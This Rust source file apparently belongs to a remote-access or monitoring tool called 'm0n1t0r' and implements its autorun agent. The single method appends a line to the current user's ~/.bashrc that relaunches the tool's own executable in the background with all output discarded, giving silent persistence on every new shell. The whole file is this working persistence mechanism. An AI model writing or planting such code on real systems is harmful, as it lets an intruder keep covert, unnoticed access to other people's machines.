use directories::UserDirs;
use m0n1t0r_common::{Error, Result as AppResult};
use remoc::rtc;
use std::{env, os::unix::prelude::OsStringExt};
use tokio::{fs, io::AsyncWriteExt};

pub struct AgentObj {}

impl AgentObj {
    pub fn new() -> Self {
        Self {}
    }
}

#[rtc::async_trait]
impl m0n1t0r_common::autorun::Agent for AgentObj {
    async fn add_current_user_bashrc(&self) -> AppResult<()> {
        let user_dirs = UserDirs::new().ok_or(Error::NotFound)?;
        let mut payload = vec!['\n' as u8, '(' as u8];
        payload.append(&mut env::current_exe()?.into_os_string().into_vec());
        payload.append(&mut "&> /dev/null &)\n".as_bytes().to_vec());

        fs::OpenOptions::new()
            .append(true)
            .open(user_dirs.home_dir().join(".bashrc"))
            .await?
            .write(&payload)
            .await?;
        Ok(())
    }
}
